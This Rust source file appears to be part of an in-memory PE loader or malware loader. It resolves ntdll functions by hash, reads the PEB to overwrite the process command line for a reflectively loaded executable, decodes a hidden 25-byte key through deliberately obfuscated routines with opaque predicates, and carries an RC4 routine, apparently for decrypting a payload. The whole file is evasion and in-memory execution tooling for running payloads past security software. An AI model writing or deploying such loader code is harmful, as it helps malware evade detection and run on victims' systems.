use crate::walker::{get_export_by_hash, get_module_base_by_hash};
use core::ffi::c_void;
use core::ptr::{copy_nonoverlapping, null_mut};
use ntapi::ntpebteb::PEB;
use std::cell::Cell;
use winapi::um::winnt::HANDLE;

#[repr(C)]
pub struct ProcessParametersStore {
    pub commandline_len_orig: u16,
    pub commandline_max_orig: u16,
    pub commandline_ptr_orig: *mut u16,
}

pub fn fix_args(store: *mut ProcessParametersStore, in_mem_pe_args: *const i8) {
    unsafe {
        let ntdll = get_module_base_by_hash(0x1edab0ed);
        type NtAlloc =
            extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
        let nt_alloc: NtAlloc =
            core::mem::transmute(get_export_by_hash(ntdll, 0xf783b8ec).unwrap());

        let peb: *mut PEB;
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        let params = (*peb).ProcessParameters;

        (*store).commandline_len_orig = (*params).CommandLine.Length;
        (*store).commandline_max_orig = (*params).CommandLine.MaximumLength;
        (*store).commandline_ptr_orig = (*params).CommandLine.Buffer;

        if in_mem_pe_args.is_null() {
            (*params).CommandLine.Length = 0;
            return;
        }

        let mut args_len = 0usize;
        while *in_mem_pe_args.add(args_len) != 0 {
            args_len += 1;
        }

        let full_path_ptr = (*params).ImagePathName.Buffer;
        let full_path_len = (*params).ImagePathName.Length as usize / 2;
        let mut name_start_idx = 0;

        for i in (0..full_path_len).rev() {
            let c = *full_path_ptr.add(i);
            if c == '\\' as u16 || c == '/' as u16 {
                name_start_idx = i + 1;
                break;
            }
        }

        let exe_name_ptr = full_path_ptr.add(name_start_idx);
        let exe_name_len = full_path_len - name_start_idx;

        let new_len_bytes = 2 + (exe_name_len * 2) + 2 + (args_len * 2);
        let alloc_size = new_len_bytes + 2;

        let mut new_buf: *mut c_void = null_mut();
        let mut size = alloc_size;
        nt_alloc(-1isize as _, &mut new_buf, 0, &mut size, 0x3000, 0x04);

        let wbuf = new_buf as *mut u16;
        core::ptr::write_bytes(new_buf, 0, alloc_size);

        *wbuf = '"' as u16;
        copy_nonoverlapping(exe_name_ptr, wbuf.add(1), exe_name_len);
        *wbuf.add(1 + exe_name_len) = '"' as u16;
        *wbuf.add(2 + exe_name_len) = ' ' as u16;

        let mut i = 0usize;
        while *in_mem_pe_args.add(i) != 0 {
            *wbuf.add(3 + exe_name_len + i) = *in_mem_pe_args.add(i) as u8 as u16;
            i += 1;
        }

        (*params).CommandLine.Buffer = wbuf;
        (*params).CommandLine.Length = new_len_bytes as u16;
        (*params).CommandLine.MaximumLength = alloc_size as u16;
    }
}

pub fn restore_args(store: *mut ProcessParametersStore) {
    unsafe {
        let ntdll = get_module_base_by_hash(0x1edab0ed);
        type NtFree = extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32) -> i32;
        let nt_free: NtFree = core::mem::transmute(get_export_by_hash(ntdll, 0x2f0e9f1f).unwrap());
        let peb: *mut PEB;
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
        let params = (*peb).ProcessParameters;
        let mut current_buf = (*params).CommandLine.Buffer as *mut c_void;
        let mut size = 0usize;
        (*params).CommandLine.Buffer = (*store).commandline_ptr_orig;
        (*params).CommandLine.Length = (*store).commandline_len_orig;
        (*params).CommandLine.MaximumLength = (*store).commandline_max_orig;
        if !current_buf.is_null() && current_buf != (*store).commandline_ptr_orig as *mut c_void {
            nt_free(-1isize as _, &mut current_buf, &mut size, 0x8000);
        }
    }
}

#[inline(always)]
fn rotl(v: u8, r: u8) -> u8 {
    (v << r) | (v >> (8 - r))
}

#[inline(always)]
fn rotr(v: u8, r: u8) -> u8 {
    (v >> r) | (v << (8 - r))
}

#[inline(never)]
fn stage_a(x: u8, k: u8) -> u8 {
    rotl(x ^ k, 3).wrapping_add(19)
}

#[inline(never)]
fn stage_b(x: u8, k: u8) -> u8 {
    rotr(x.wrapping_sub(7) ^ k, 2)
}

#[inline(never)]
fn opaque(x: u8) -> u8 {
    let y = Cell::new(x);
    if (y.get().wrapping_mul(y.get())) & 1 == 0 {
        y.get() ^ 0x5A
    } else {
        y.get() ^ 0x5A
    }
}

pub fn build_string() -> Vec<u8> {
    let blob: [u8; 25] = [
        77, 221, 98, 133, 213, 35, 188, 21, 207, 27, 209, 153, 12, 247, 226, 166, 29, 46, 65, 181,
        38, 135, 67, 218, 246,
    ];
    let key1: [u8; 25] = [
        243, 153, 64, 132, 103, 225, 37, 144, 55, 200, 119, 197, 71, 111, 79, 17, 143, 171, 127,
        144, 165, 51, 231, 31, 81,
    ];
    let key2: [u8; 25] = [
        19, 213, 181, 154, 34, 46, 96, 22, 158, 7, 228, 174, 130, 12, 173, 86, 104, 195, 93, 213,
        7, 85, 245, 198, 32,
    ];

    let mut out = [0u8; 25];
    let mut state: u8 = 64;

    for i in 0..25 {
        let mut v = blob[i];

        match state & 3 {
            0 => v = stage_a(v, key1[i]),
            1 => v = stage_b(v, key2[i]),
            2 => v = stage_b(stage_a(v, key1[i]), key2[i]),
            _ => v = stage_a(stage_b(v, key2[i]), key1[i]),
        }

        v = opaque(v);
        out[i] = v;
        state = rotl(state ^ v, 1);
    }
    out.to_vec()
}

pub struct State {
    state: [u8; 256],
    i: u8,
    j: u8,
}

impl State {
    pub fn new(key: &[u8]) -> Self {
        let mut rc4 = Self {
            state: [0; 256],
            i: 0,
            j: 0,
        };
        for i in 0..256 {
            rc4.state[i] = i as u8;
        }
        let mut j: u8 = 0;
        for i in 0..256 {
            j = j
                .wrapping_add(rc4.state[i])
                .wrapping_add(key[i % key.len()]);
            rc4.state.swap(i, j as usize);
        }
        rc4
    }

    pub fn next(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.state[self.i as usize]);
        self.state.swap(self.i as usize, self.j as usize);
        let index = self.state[self.i as usize].wrapping_add(self.state[self.j as usize]);
        self.state[index as usize]
    }

    pub fn apply_keystream(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            *byte ^= self.next();
        }
    }
}
